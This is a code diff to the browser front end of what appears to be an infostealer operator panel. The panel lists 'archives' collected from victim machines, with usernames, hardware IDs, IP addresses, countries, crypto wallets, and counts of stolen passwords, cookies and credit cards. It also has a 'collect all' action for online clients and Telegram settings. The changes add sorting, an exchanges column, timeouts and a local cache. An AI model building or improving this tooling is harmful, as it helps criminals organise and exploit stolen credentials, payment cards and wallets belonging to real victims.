@@ -19,6 +19,8 @@
 
   let archives = [];
   let filter = "";
+  let sortKey = "";
+  let sortDir = "desc";
   const selected = new Set();
   let currentFile = null; // { name, blob }
 
@@ -55,6 +57,7 @@
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ method, params }),
+      signal: AbortSignal.timeout(10000),
     });
     const body = await res.json().catch(() => ({}));
     if (!res.ok || body.ok === false) {
@@ -86,12 +89,47 @@
       info.Username, info.HWID, info.IpAddress, info.Country, info.Note,
       joinList(info.Browsers), joinList(info.Apps),
       joinList(info.DesktopWallets), joinList(info.BrowserExtensions),
+      joinList(row.exchanges),
     ].join(" ").toLowerCase();
   }
 
   function filteredArchives() {
-    if (!filter) return archives;
-    return archives.filter((row) => searchableText(row).includes(filter));
+    let rows = filter ? archives.filter((row) => searchableText(row).includes(filter)) : [...archives];
+    if (sortKey) {
+      const key = sortKey;
+      const dir = sortDir === "asc" ? 1 : -1;
+      const numeric = new Set(["time", "domain", "passwords", "cookies", "cards", "seen"]);
+      const val = (row) => {
+        const info = row.info || {};
+        switch (key) {
+          case "time": return new Date(row.createdAt).getTime() || 0;
+          case "username": return (info.Username || "").toLowerCase();
+          case "hwid": return (info.HWID || "").toLowerCase();
+          case "group": return (info.Group || "").toLowerCase();
+          case "note": return (info.Note || "").toLowerCase();
+          case "country": return (info.Country || "").toLowerCase();
+          case "ip": return (info.IpAddress || "").toLowerCase();
+          case "version": return (info.Version || "").toLowerCase();
+          case "seen": return row.seen ? 1 : 0;
+          case "domain": return Number(info.HistoryCount) || 0;
+          case "browser": return joinList(info.Browsers).toLowerCase();
+          case "extensions": return joinList(info.BrowserExtensions).toLowerCase();
+          case "passwords": return Number(info.PasswordsCount) || 0;
+          case "cookies": return Number(info.CookiesCount) || 0;
+          case "cards": return Number(info.CreditCardsCount) || 0;
+          case "wallets": return joinList(info.DesktopWallets).toLowerCase();
+          case "exchanges": return joinList(row.exchanges).toLowerCase();
+          case "apps": return joinList(info.Apps).toLowerCase();
+          default: return "";
+        }
+      };
+      rows.sort((a, b) => {
+        const va = val(a), vb = val(b);
+        if (numeric.has(key)) return (va - vb) * dir;
+        return String(va).localeCompare(String(vb)) * dir;
+      });
+    }
+    return rows;
   }
 
   // Raw 32-char extension IDs (unmapped extensions) are grouped for display;
@@ -113,7 +151,7 @@
     checkAll.checked = rows.length > 0 && rows.every((r) => selected.has(r.id));
 
     if (rows.length === 0) {
-      tbody.innerHTML = `<tr><td colspan="20" class="xf-empty">${archives.length === 0 ? "No archives collected yet." : "No archives match the search."}</td></tr>`;
+      tbody.innerHTML = `<tr><td colspan="21" class="xf-empty">${archives.length === 0 ? "No archives collected yet." : "No archives match the search."}</td></tr>`;
       return;
     }
 
@@ -144,6 +182,7 @@
         <td class="xf-col-num">${fmtNum(info.CookiesCount)}</td>
         <td class="xf-col-num">${fmtNum(info.CreditCardsCount)}</td>
         <td class="xf-col-list" title="${escapeHtml(joinList(info.DesktopWallets))}">${escapeHtml(joinList(info.DesktopWallets))}</td>
+        <td class="xf-col-list" title="${escapeHtml(joinList(row.exchanges))}">${escapeHtml(joinList(row.exchanges))}</td>
         <td class="xf-col-list" title="${escapeHtml(joinList(info.Apps))}">${escapeHtml(joinList(info.Apps))}</td>
         <td class="xf-col-actions">
           <div class="xf-row-actions">
@@ -159,10 +198,25 @@
     try {
       archives = await rpc("list");
       renderTable();
+      // Cache the trimmed list for instant paint on next visit.
+      try {
+        localStorage.setItem("xfill-cache", JSON.stringify(archives.slice(0, 300)));
+      } catch {}
     } catch (err) {
       tbody.innerHTML = `<tr><td colspan="20" class="xf-empty">Failed to load archives: ${escapeHtml(err.message)}</td></tr>`;
     }
   }
+
+  // Instant paint from cache; the fresh fetch refreshes in the background.
+  (function paintFromCache() {
+    try {
+      const cached = JSON.parse(localStorage.getItem("xfill-cache") || "null");
+      if (Array.isArray(cached) && cached.length > 0) {
+        archives = cached;
+        renderTable();
+      }
+    } catch {}
+  })();
 
   /* ── selection & toolbar ── */
 
@@ -316,7 +370,7 @@
 
   async function loadClients() {
     try {
-      const res = await fetch("/api/clients?pageSize=200&status=online");
+      const res = await fetch("/api/clients?pageSize=200&status=online", { signal: AbortSignal.timeout(10000) });
       if (!res.ok) throw new Error(res.statusText);
       const data = await res.json();
       const online = (data.items || []).filter((c) => c.online);
@@ -359,7 +413,7 @@
     collectAllBtn.addEventListener("click", async () => {
       collectAllBtn.disabled = true;
       try {
-        const res = await fetch("/api/clients?pageSize=500&status=online");
+        const res = await fetch("/api/clients?pageSize=500&status=online", { signal: AbortSignal.timeout(10000) });
         if (!res.ok) throw new Error(res.statusText);
         const data = await res.json();
         const online = (data.items || []).filter((c) => c.online);
@@ -529,6 +583,27 @@
   document.getElementById("xf-viewer-close").addEventListener("click", () => viewer.close());
   viewer.addEventListener("click", (e) => {
     if (e.target === viewer) viewer.close();
+  });
+
+  /* ── column sorting ── */
+
+  document.querySelectorAll("th.xf-sortable").forEach((th) => {
+    th.addEventListener("click", (e) => {
+      e.stopPropagation();
+      const key = th.dataset.sort;
+      if (!key) return;
+      if (sortKey === key) {
+        sortDir = sortDir === "asc" ? "desc" : "asc";
+      } else {
+        sortKey = key;
+        sortDir = "desc";
+      }
+      document.querySelectorAll("th.xf-sortable").forEach((h) => {
+        h.classList.remove("xf-sort-asc", "xf-sort-desc");
+      });
+      th.classList.add(sortDir === "asc" ? "xf-sort-asc" : "xf-sort-desc");
+      renderTable();
+    });
   });
 
   /* ── telegram settings ── */
